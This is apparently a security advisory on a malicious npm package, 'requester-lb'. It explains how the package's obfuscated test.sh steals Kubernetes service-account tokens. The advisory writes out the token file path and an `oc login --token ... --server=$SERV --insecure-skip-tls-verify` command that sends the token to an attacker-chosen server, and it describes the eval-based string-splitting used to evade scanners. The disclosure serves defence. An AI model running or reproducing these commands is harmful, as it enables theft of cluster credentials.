summary: requester-lb ships obfuscated shell payload that exfiltrates Kubernetes service-account tokens via oc login to an attacker-chosen server
details: The package advertises itself as an HTTP/DNS requester CLI but ships a test.sh whose primary purpose is credential theft. test.sh splits sensitive commands into ~10 single-letter shell variables that are concatenated and passed to eval, reconstructing `printenv` and a command that reads the in-pod Kubernetes service-account token from /var/run/secrets/kubernetes.io/serviceaccount/token into $DEBUG_FILE, then invokes `./oc login --token=$DEBUG_FILE --server=$SERV --insecure-skip-tls-verify` to authenticate the current cluster identity to a server specified via the SERV environment variable. The string-fragment obfuscation has no benign purpose and is a deliberate scanner-evasion pattern. The package layout corroborates the disguise: package.json declares `main: index.js` but no index.js is shipped, the only legitimate JS (requester.js) is unrelated to the shell payload, and test.sh is not referenced by any npm script — it is a standalone delivery vehicle for an operator or CI job that executes it inside a Kubernetes/OpenShift pod. The payload does not auto-execute on `npm install` (no lifecycle hook invokes test.sh), but the harm on explicit execution is cluster credential theft and attacker-controlled cluster federation with TLS verification disabled.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
